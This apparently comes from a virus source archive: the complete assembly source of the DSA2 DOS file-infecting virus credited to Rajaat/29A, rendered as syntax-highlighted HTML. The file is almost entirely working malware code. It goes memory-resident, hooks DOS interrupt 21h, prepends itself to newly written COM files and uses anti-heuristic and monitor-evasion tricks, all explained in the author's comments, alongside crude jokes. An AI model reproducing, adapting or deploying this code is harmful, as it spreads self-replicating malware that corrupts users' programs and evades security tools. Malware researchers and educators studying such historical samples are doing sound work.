<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Rajaat.245 - dsa2.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;=====( DSA2 Virus by Rajaat / 29A )===========================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus name    : DSA2</span><span class="sc0">
</span><span class="sc1">; Author        : Rajaat / 29A</span><span class="sc0">
</span><span class="sc1">; Origin        : United Kingdom, December 1997</span><span class="sc0">
</span><span class="sc1">; Compiling     : Using TASM</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 TASM /M DSA2</span><span class="sc0">
</span><span class="sc1">;                 TLINK /T DSA2</span><span class="sc0">
</span><span class="sc1">; Targets       : COM files</span><span class="sc0">
</span><span class="sc1">; Size          : 245 bytes</span><span class="sc0">
</span><span class="sc1">; Resident      : Yes, doesn't decrease memory</span><span class="sc0">
</span><span class="sc1">; Polymorphic   : No</span><span class="sc0">
</span><span class="sc1">; Encrypted     : No</span><span class="sc0">
</span><span class="sc1">; Stealth       : No</span><span class="sc0">
</span><span class="sc1">; Tunneling     : Uses SFT to avoid some monitors</span><span class="sc0">
</span><span class="sc1">; Retrovirus    : No</span><span class="sc0">
</span><span class="sc1">; Antiheuristics: Only TBSpoof</span><span class="sc0">
</span><span class="sc1">; Peculiarities : It won't get far</span><span class="sc0">
</span><span class="sc1">; Drawbacks     : Don't write me, I know all of them ;-)</span><span class="sc0">
</span><span class="sc1">; Behaviour     : When an infected COM file is executed, the virus will</span><span class="sc0">
</span><span class="sc1">;                 go resident in the stack reserved for dos INT 21</span><span class="sc0">
</span><span class="sc1">;                 functions &lt;0ch and hook INT 21. There will be no</span><span class="sc0">
</span><span class="sc1">;                 visible decrease in conventional memory. The virus</span><span class="sc0">
</span><span class="sc1">;                 will then pass control to the host by shifting the</span><span class="sc0">
</span><span class="sc1">;                 whole host back over the virus code (this virus is</span><span class="sc0">
</span><span class="sc1">;                 prepending). From now, every COM file of 0 bytes in</span><span class="sc0">
</span><span class="sc1">;                 length that is written to (except for misnamed EXE</span><span class="sc0">
</span><span class="sc1">;                 files) will get infected. If a write is done, DSA2</span><span class="sc0">
</span><span class="sc1">;                 check wether the current filesize is 0, the file</span><span class="sc0">
</span><span class="sc1">;                 handle does not belong to a device, the amount of</span><span class="sc0">
</span><span class="sc1">;                 which will be written is not too big or too small and</span><span class="sc0">
</span><span class="sc1">;                 last but not least wether it is already infected or</span><span class="sc0">
</span><span class="sc1">;                 not. If all requirements are met, DSA2 will write</span><span class="sc0">
</span><span class="sc1">;                 itself to the file and then let the original write</span><span class="sc0">
</span><span class="sc1">;                 proceed. This makes DSA2 a slow infector and doesn't</span><span class="sc0">
</span><span class="sc1">;                 need a critical error handler.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 It's unknown what this virus might do besides replicate :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 Well, actually this virus is a little combination of</span><span class="sc0">
</span><span class="sc1">;                 two other viruses that are both written by me,</span><span class="sc0">
</span><span class="sc1">;                 Andropinis and DSA. The virus will use some tricks to</span><span class="sc0">
</span><span class="sc1">;                 make it tough to av programs to detect the virus and</span><span class="sc0">
</span><span class="sc1">;                 to remove it heuristically. There is no decrease in</span><span class="sc0">
</span><span class="sc1">;                 conventional memory and it isn't very noticeable.</span><span class="sc0">
</span><span class="sc1">;                 Unfortunately there are not many COM files in use now</span><span class="sc0">
</span><span class="sc1">;                 anymore, but that's how the cookie crumbles.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 Thanks to Sandy for lashing me to work and comment</span><span class="sc0">
</span><span class="sc1">;                 this virus, and the rest for supporting me.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 As a side note, I want to dedicate this virus to a</span><span class="sc0">
</span><span class="sc1">;                 friend of mine who had some very traumatic experience</span><span class="sc0">
</span><span class="sc1">;                 with a car and a dog. I wish him luck and I hope he</span><span class="sc0">
</span><span class="sc1">;                 recovers soon enough and can leave the mental</span><span class="sc0">
</span><span class="sc1">;                 institute again.... Naaaah just kidding :*)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 UK != OK</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;=====( Start of code )========================================================</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">                             </span><span class="sc1">; tiny tidy shitty whatever</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">; what I always wanted to do</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                               </span><span class="sc1">; I think in HEX</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">                                    </span><span class="sc1">; I am tired of XT weenies. spend some</span><span class="sc0">
                                        </span><span class="sc1">; money and buy a REAL machine</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                 </span><span class="sc1">; com offset</span><span class="sc0">

</span><span class="sc5">main</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; TBSpoof (not for newer versions)</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; clear direction bit (wow!)</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">main</span><span class="sc0">             </span><span class="sc1">; Squeeze doggy.. eehhh entrypoint on</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; the stack</span><span class="sc0">


</span><span class="sc1">;=====( Some wise words from Ralph Brown )=====================================</span><span class="sc0">
</span><span class="sc1">; INT 21 U - DOS 3.0+ internal - GET ADDRESS OF DOS SWAPPABLE DATA AREA</span><span class="sc0">
</span><span class="sc1">; AX = 5D06h</span><span class="sc0">
</span><span class="sc1">; Return:</span><span class="sc0">
</span><span class="sc1">; CF set on error         AX = error code (see #1020)</span><span class="sc0">
</span><span class="sc1">; CF clear if successful  DS:SI -&gt; nonreentrant data area (includes all three D</span><span class="sc0">
</span><span class="sc1">;                                  DOS stacks) (critical error flag is first</span><span class="sc0">
</span><span class="sc1">;                                  byte) (see #1027)</span><span class="sc0">
</span><span class="sc1">;                         CX = size in bytes of area which must be swapped</span><span class="sc0">
</span><span class="sc1">;                              while in DOS</span><span class="sc0">
</span><span class="sc1">;                         DX = size in bytes of area which must always be</span><span class="sc0">
</span><span class="sc1">;                              swapped</span><span class="sc0">
</span><span class="sc1">;=====( Thank you sir! )=======================================================</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5d06</span><span class="sc0">             </span><span class="sc1">; see above piece</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; swap si to ax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f</span><span class="sc0">              </span><span class="sc1">; is it paragraph aligned? (should be)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_resident</span><span class="sc0">         </span><span class="sc1">; no, bummer, we are resident :-)</span><span class="sc0">

                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; convert it to segment address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">               </span><span class="sc1">; add paragraphs to stack - 10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">; add ds to the converted paragraphs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; I like Snoop Doggy Dog $-)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0"> </span><span class="sc1">; are we there yet?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">is_resident</span><span class="sc0">            </span><span class="sc1">; yes, bailout time</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; get start address of virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; in both source and destination</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">       </span><span class="sc1">; and move the virus to the dos</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; stack</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">; whoop, some segment juggling here</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; for my ease</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521</span><span class="sc0">             </span><span class="sc1">; now where did I put that int 21h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                  </span><span class="sc1">; vector to? let's kindly ask DOS to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">int_21</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; provide that for me, and store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">int_21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc1">; into my memory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">               </span><span class="sc1">; in order to be able to replicate, the</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">new_21</span><span class="sc0">           </span><span class="sc1">; virus hooks int 21h itself</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;=====( Return to host handler )===============================================</span><span class="sc0">

</span><span class="sc5">is_resident</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; this was the pushed bx register &amp;^)</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; this was the pushed ax register @:-)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">; clean some segment registers by</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                 </span><span class="sc1">; setting them to the code segment</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; again...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c3a4</span><span class="sc0">              </span><span class="sc1">; now this is what makes this puppy a</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f357</span><span class="sc0">              </span><span class="sc1">; bit special, it pushes a rep movsb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">                 </span><span class="sc1">; and a ret on the stack and the stack</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0">        </span><span class="sc1">; its own address and then jumps to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                </span><span class="sc1">; stack, which shifts the complete host</span><span class="sc0">
</span><span class="sc5">host_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">; down and then returns to 100h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[DSA2]'</span><span class="sc0">             </span><span class="sc1">; I could have called it DogCrusher,</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Rajaat/29A]'</span><span class="sc0">       </span><span class="sc1">; but I don't wanna hurt Jqwerty his</span><span class="sc0">
                                        </span><span class="sc1">; feelings &gt;8-)</span><span class="sc0">

</span><span class="sc1">;=====( Resident handler of the virus )========================================</span><span class="sc0">

</span><span class="sc5">new_21</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">               </span><span class="sc1">; is it a write action?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">write_to_file</span><span class="sc0">        </span><span class="sc1">; yea, let's go check it out</span><span class="sc0">

</span><span class="sc5">eoi_21</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int_21</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; thank you, drive through</span><span class="sc0">

</span><span class="sc5">write_to_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; i don't want to spoil these registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; so I push them on the stack.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                 </span><span class="sc1">; http://www.europa.com/~dogman</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">; hahahahahaha</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400</span><span class="sc0">             </span><span class="sc1">; check if the file belongs to a device</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                  </span><span class="sc1">; or not....</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_suitable</span><span class="sc0">        </span><span class="sc1">; if so, it's not for use.</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220</span><span class="sc0">             </span><span class="sc1">; get the file handle table for the</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2f</span><span class="sc0">                  </span><span class="sc1">; file handle that is now in bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216</span><span class="sc0">             </span><span class="sc1">; jq performs it doggy style ;-)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">2f</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2020</span><span class="sc0">                </span><span class="sc1">; now we gonna check if the file has</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; a com extension. if it hasn't it</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; is bailout time again.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'oc'</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_suitable</span><span class="sc0">           </span><span class="sc1">; doesn't start with "co"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2a</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc0">                 </span><span class="sc1">; doesn't end with "m"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_suitable</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; if the current file length is 0,</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">not_suitable</span><span class="sc0">           </span><span class="sc1">; the file has just been created,</span><span class="sc0">
                                           </span><span class="sc1">; which is great, since this virus</span><span class="sc0">
                                           </span><span class="sc1">; is a great slow infector</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000</span><span class="sc0">             </span><span class="sc1">; if the file is too small for our</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">not_suitable</span><span class="sc0">         </span><span class="sc1">; liking, it's bailout time again</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0f000</span><span class="sc0">            </span><span class="sc1">; and if the file is too large we quit</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">check_exe</span><span class="sc0">           </span><span class="sc1">; too, otherwise we jump to check_exe</span><span class="sc0">

</span><span class="sc5">not_suitable</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; get the wasted register again from</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; the stack we put them on some lines</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; above here.</span><span class="sc0">
</span><span class="sc5">is_renamed_exe</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">eoi_21</span><span class="sc0">              </span><span class="sc1">; and chain to the old interrupt 21h</span><span class="sc0">

</span><span class="sc5">check_exe</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; get some registers we need</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; does the write contain an exe</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0"> </span><span class="sc1">; header?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_renamed_exe</span><span class="sc0">         </span><span class="sc1">; if so, we leave here.</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0"> </span><span class="sc1">; is it already infected?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">is_renamed_exe</span><span class="sc0">         </span><span class="sc1">; yes, we leave again (are we exe?</span><span class="sc0">
                                          </span><span class="sc1">; no but i hate multiple</span><span class="sc0">
                                          </span><span class="sc1">; references)</span><span class="sc0">

</span><span class="sc1">;=====( Actual infection routine - very simplistic )============================</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; get filehandle from stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                 </span><span class="sc1">; same some values we need (length we</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; wanted to write, and offset)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                    </span><span class="sc1">; write our own code before the</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; file as some extra attachment.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">host_size</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">  </span><span class="sc1">; so we actually didn't have to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                  </span><span class="sc1">; open and close the file ourselves.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">          </span><span class="sc1">; this saves a lot of time, we don't</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">main</span><span class="sc0">                </span><span class="sc1">; need an error handler.</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int_21</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; pop some registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">is_renamed_exe</span><span class="sc0">      </span><span class="sc1">; and we are done</span><span class="sc0">

</span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; here we store the original int 21h</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                   </span><span class="sc1">; end of virus ofcourse</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">      </span><span class="sc1">; the size of the virus</span><span class="sc0">

</span><span class="sc1">;=====( Host file )============================================================</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00</span><span class="sc0">             </span><span class="sc1">; exit to dos with exit code</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                  </span><span class="sc1">; this is actually a carrier host</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">                                </span><span class="sc1">; curtains fall... :-0</span><span class="sc0">

</span><span class="sc1">;=====( This is the the end, the very end, make the best of it, and goodbye )==</span><span class="sc0">
